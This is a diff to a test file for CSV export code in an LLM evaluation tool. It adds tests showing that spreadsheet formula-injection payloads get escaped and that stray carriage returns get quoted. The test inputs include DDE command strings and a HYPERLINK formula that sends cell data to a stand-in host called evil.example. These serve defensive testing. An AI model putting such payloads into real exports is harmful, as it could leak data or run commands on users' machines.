@@ -2,8 +2,10 @@ import { parse as parseCsv } from 'csv-parse/sync';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { ResultFailureReason } from '../../../src/types/index';
 import {
+  escapeCsvFormula,
   evalTableToCsv,
   evalTableToJson,
+  generateEvalCsv,
   getEvalTableOutputPromptLocationsBySize,
   getEvalTablePromptStrippedPayload,
   STRIPPED_TABLE_CELL_PROMPT,
@@ -21,6 +23,11 @@ import type {
 
 type LegacyCompletedPrompt = Omit<CompletedPrompt, 'metrics'> & {
   metrics: Omit<NonNullable<CompletedPrompt['metrics']>, 'namedScoresCount'>;
+};
+
+const parseCsvRow = (line: string): string[] => {
+  const [row = []] = parseCsv(line, { relax_quotes: true }) as string[][];
+  return row;
 };
 
 describe('evalTableUtils', () => {
@@ -217,6 +224,8 @@ describe('evalTableUtils', () => {
                   namedScores: {
                     clarity: 0.9,
                     accuracy: 0.8,
+                    é: 1,
+                    invalid: NaN,
                   },
                 } as unknown as EvaluateTableOutput,
               ],
@@ -230,6 +239,7 @@ describe('evalTableUtils', () => {
                   score: 0.75,
                   namedScores: {
                     clarity: 0.7,
+                    'e\u0301': 0.5,
                   },
                 } as unknown as EvaluateTableOutput,
               ],
@@ -240,8 +250,12 @@ describe('evalTableUtils', () => {
         const csv = evalTableToCsv(tableWithNamedScores);
         const lines = csv.split('\n');
 
-        expect(lines[0]).toContain('Metric: accuracy');
-        expect(lines[0]).toContain('Metric: clarity');
+        expect(parseCsvRow(lines[0]).filter((cell) => cell.startsWith('Metric: '))).toEqual([
+          'Metric: accuracy',
+          'Metric: clarity',
+          'Metric: é',
+          'Metric: e\u0301',
+        ]);
         expect(lines[1]).toContain('0.80,0.90');
         expect(lines[2]).toContain(',0.70');
       });
@@ -587,34 +601,8 @@ describe('evalTableUtils', () => {
         const csv = evalTableToCsv(tableWithMultipleOutputs); // No isRedteam flag
         const lines = csv.split('\n').filter((line: string) => line.trim());
 
-        // Parse CSV to count columns
-        const parseCSVLine = (line: string): string[] => {
-          const result: string[] = [];
-          let current = '';
-          let inQuotes = false;
-
-          for (let i = 0; i < line.length; i++) {
-            const char = line[i];
-            const nextChar = line[i + 1];
-
-            if (char === '"' && nextChar === '"') {
-              current += '"';
-              i++;
-            } else if (char === '"') {
-              inQuotes = !inQuotes;
-            } else if (char === ',' && !inQuotes) {
-              result.push(current);
-              current = '';
-            } else {
-              current += char;
-            }
-          }
-          result.push(current);
-          return result;
-        };
-
-        const headerCols = parseCSVLine(lines[0]);
-        const dataCols = parseCSVLine(lines[1]);
+        const headerCols = parseCsvRow(lines[0]);
+        const dataCols = parseCsvRow(lines[1]);
 
         // Header and data row should have the same number of columns
         expect(headerCols.length).toBe(dataCols.length);
@@ -684,38 +672,8 @@ describe('evalTableUtils', () => {
         const csv = evalTableToCsv(tableWithMultipleOutputs, { isRedteam: true });
         const lines = csv.split('\n').filter((line: string) => line.trim());
 
-        // Parse CSV using a simple comma count approach for validation
-        // Count actual CSV fields by splitting on commas not inside quotes
-        const parseCSVLine = (line: string): string[] => {
-          const result: string[] = [];
-          let current = '';
-          let inQuotes = false;
-
-          for (let i = 0; i < line.length; i++) {
-            const char = line[i];
-            const nextChar = line[i + 1];
-
-            if (char === '"' && nextChar === '"') {
-              // Escaped quote
-              current += '"';
-              i++; // Skip next char
-            } else if (char === '"') {
-              // Toggle quote state
-              inQuotes = !inQuotes;
-            } else if (char === ',' && !inQuotes) {
-              // Field separator
-              result.push(current);
-              current = '';
-            } else {
-              current += char;
-            }
-          }
-          result.push(current); // Add last field
-          return result;
-        };
-
-        const headerCols = parseCSVLine(lines[0]);
-        const dataCols = parseCSVLine(lines[1]);
+        const headerCols = parseCsvRow(lines[0]);
+        const dataCols = parseCsvRow(lines[1]);
 
         // Header and data row should have the same number of columns
         expect(headerCols.length).toBe(dataCols.length);
@@ -907,6 +865,27 @@ describe('evalTableUtils', () => {
     });
 
     describe('Edge cases and special characters', () => {
+      it('quotes lone carriage returns in headers and data without creating extra rows', () => {
+        mockTable.head.vars[0] = 'var\rname';
+        mockTable.body = [mockTable.body[0]];
+        mockTable.body[0].test.description = 'First\rsecond';
+        mockTable.body[0].vars[0] = 'left\rright';
+        mockTable.body[0].outputs[0].text = 'response\rcontinued';
+
+        const csv = evalTableToCsv(mockTable);
+
+        for (const field of ['var\rname', 'First\rsecond', 'left\rright', 'response\rcontinued']) {
+          expect(csv).toContain(`"${field}"`);
+        }
+        const rows = parseCsv(csv, { record_delimiter: ['\r\n', '\n', '\r'] }) as string[][];
+        expect(rows).toHaveLength(2);
+        expect(rows[0]).toContain('var\rname');
+        expect(rows[1]).toEqual(
+          expect.arrayContaining(['First\rsecond', 'left\rright', 'response\rcontinued']),
+        );
+        expect(rows[1]).toHaveLength(rows[0].length);
+      });
+
       it('should handle special characters in text fields', () => {
         const tableWithSpecialChars = {
           ...mockTable,
@@ -1183,11 +1162,18 @@ describe('evalTableUtils', () => {
     });
   });
 
-  // Build a CompletedPrompt that mimics legacy/imported persistence: the
-  // `metrics` object exists but lacks `namedScoresCount`. The streaming CSV
-  // path must fall back to a row-scan discovery pass for these prompts.
-  // `overrides.namedScores` contains aggregate prompt-level metrics; per-row
-  // named scores remain on the individual result rows.
+  /**
+   * Creates a prompt that mimics legacy/imported persistence without
+   * `metrics.namedScoresCount`, forcing the streaming CSV path to fall back to
+   * a row-scan discovery pass.
+   *
+   * `overrides.namedScores` contains aggregate prompt metrics; per-row scores
+   * remain on the individual results.
+   *
+   * @param raw - Raw prompt text.
+   * @param overrides - Prompt overrides and aggregate named scores.
+   * @returns A completed prompt in the legacy persisted shape.
+   */
   function createLegacyCompletedPrompt(
     raw: string,
     overrides: { namedScores: Record<string, number> } & Partial<Omit<CompletedPrompt, 'metrics'>>,
@@ -1287,6 +1273,16 @@ describe('evalTableUtils', () => {
       expect(secondIdx).toBeLessThan(thirdIdx);
     });
 
+    /**
+     * Streams fixture results through `streamEvalCsv` and returns the complete CSV output.
+     *
+     * @param params - Fixture data used to construct the mocked eval.
+     * @param params.vars - Variable names included in the CSV.
+     * @param params.prompts - Prompt definitions used by the eval.
+     * @param params.results - Result fixtures yielded by `fetchResultsBatched`.
+     * @param params.isRedteam - Whether to use redteam CSV formatting.
+     * @returns The concatenated CSV chunks emitted by `streamEvalCsv`.
+     */
     async function runStreamEvalCsv({
       vars,
       prompts,
@@ -1361,6 +1357,34 @@ describe('evalTableUtils', () => {
       expect(lines[0]).toContain('Metric: relevance');
       expect(lines[1]).toContain('0.70,0.90');
       expect(lines[2]).toContain(',0.50');
+    });
+
+    it('quotes lone carriage returns when streaming CSV', async () => {
+      const csv = await runStreamEvalCsv({
+        vars: ['var\rname'],
+        prompts: [createCompletedPrompt('Prompt 1', {})],
+        results: [
+          {
+            testIdx: 0,
+            promptIdx: 0,
+            testCase: { vars: { 'var\rname': 'left\rright' }, description: 'First\rsecond' },
+            response: { output: 'response\rcontinued' },
+            success: true,
+            score: 1,
+          },
+        ],
+      });
+
+      for (const field of ['var\rname', 'First\rsecond', 'left\rright', 'response\rcontinued']) {
+        expect(csv).toContain(`"${field}"`);
+      }
+      const rows = parseCsv(csv, { record_delimiter: ['\r\n', '\n', '\r'] }) as string[][];
+      expect(rows).toHaveLength(2);
+      expect(rows[0]).toContain('var\rname');
+      expect(rows[1]).toEqual(
+        expect.arrayContaining(['First\rsecond', 'left\rright', 'response\rcontinued']),
+      );
+      expect(rows[1]).toHaveLength(rows[0].length);
     });
 
     it('escapes formula-injection payloads when streaming CSV', async () => {
@@ -1847,6 +1871,78 @@ describe('evalTableUtils', () => {
   });
 });
 
+describe('escapeCsvFormula', () => {
+  it.each([
+    ['=1+1', "'=1+1"],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
+    ['+1+1', "'+1+1"],
+    ['-1+1', "'-1+1"],
+    ['-2+cmd', "'-2+cmd"],
+  ])('prefixes formula trigger %p -> %p', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\t=danger', "'\t=danger"],
+    ['\r=danger', "'\r=danger"],
+    ['  =danger', "'  =danger"],
+    ['\t@SUM(A1)', "'\t@SUM(A1)"],
+    ['\r-1+1', "'\r-1+1"],
+    ['\n\t =evil', "'\n\t =evil"],
+  ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\u200B=1+1', "'\u200B=1+1"],
+    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"],
+    ['\u200D=cmd', "'\u200D=cmd"],
+  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-Infinity', "'-Infinity"],
+    ['+Infinity', "'+Infinity"],
+    ['-1e400', "'-1e400"],
+  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    [
+      '=HYPERLINK("https://evil.example?x="&A1,"click")',
+      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
+    ],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-5', '-5'],
+    ['-5.25', '-5.25'],
+    ['-1e3', '-1e3'],
+    ['+5', '+5'],
+    ['+3.14', '+3.14'],
+  ])('leaves legitimate numbers untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['hello world', 'hello world'],
+    ['5-3', '5-3'],
+    ['a=b', 'a=b'],
+    ['user@example.com', 'user@example.com'],
+    ['', ''],
+    ['   ', '   '],
+    ['\t\t', '\t\t'],
+  ])('leaves non-formula values untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+});
+
 describe('evalTableToCsv formula injection (CWE-1236)', () => {
   const buildFormulaTable = () => ({
     head: {
@@ -1894,6 +1990,68 @@ describe('evalTableToCsv formula injection (CWE-1236)', () => {
     } finally {
       vi.unstubAllEnvs();
     }
+  });
+
+  it('uses the evaluation config env before process.env', () => {
+    vi.stubEnv('PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING', 'true');
+    try {
+      const [, dataRow] = parseCsv(
+        evalTableToCsv(buildFormulaTable(), {
+          env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'false' },
+        }),
+      ) as string[][];
+
+      expect(dataRow[1]).toBe("'=cmd|calc");
+      expect(dataRow[2]).toBe('\'=HYPERLINK("http://evil.example","click")');
+    } finally {
+      vi.unstubAllEnvs();
+    }
+  });
+
+  it('uses config.env for full-table evaluation exports', async () => {
+    const csv = await generateEvalCsv({
+      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
+      getTablePage: vi.fn().mockResolvedValue(buildFormulaTable()),
+    } as unknown as Eval);
+    const [, dataRow] = parseCsv(csv) as string[][];
+
+    expect(dataRow[1]).toBe('=cmd|calc');
+    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
+  });
+
+  it('uses config.env for streaming evaluation exports', async () => {
+    const mockEval = {
+      config: { env: { PROMPTFOO_DISABLE_CSV_FORMULA_ESCAPING: 'true' } },
+      vars: ['input'],
+      prompts: [createCompletedPrompt('{{input}}', { provider: 'echo', label: 'Prompt 1' })],
+      fetchResultsBatched: async function* () {
+        yield [
+          {
+            testIdx: 0,
+            promptIdx: 0,
+            testCase: { vars: { input: '=cmd|calc' }, description: '=danger' },
+            response: { output: '=HYPERLINK("http://evil.example","click")' },
+            success: false,
+            score: 0,
+            namedScores: {},
+            failureReason: ResultFailureReason.ASSERT,
+            gradingResult: { pass: false, reason: '@SUM(A1)', comment: 'plain comment' },
+            metadata: {},
+          },
+        ];
+      },
+    } as unknown as Eval;
+    const chunks: string[] = [];
+
+    await streamEvalCsv(mockEval, {
+      write: (data) => {
+        chunks.push(data);
+      },
+    });
+    const [, dataRow] = parseCsv(chunks.join('')) as string[][];
+
+    expect(dataRow[1]).toBe('=cmd|calc');
+    expect(dataRow[2]).toBe('=HYPERLINK("http://evil.example","click")');
   });
 
   it('escapes formula triggers in header cells (var name and bare prompt label)', () => {
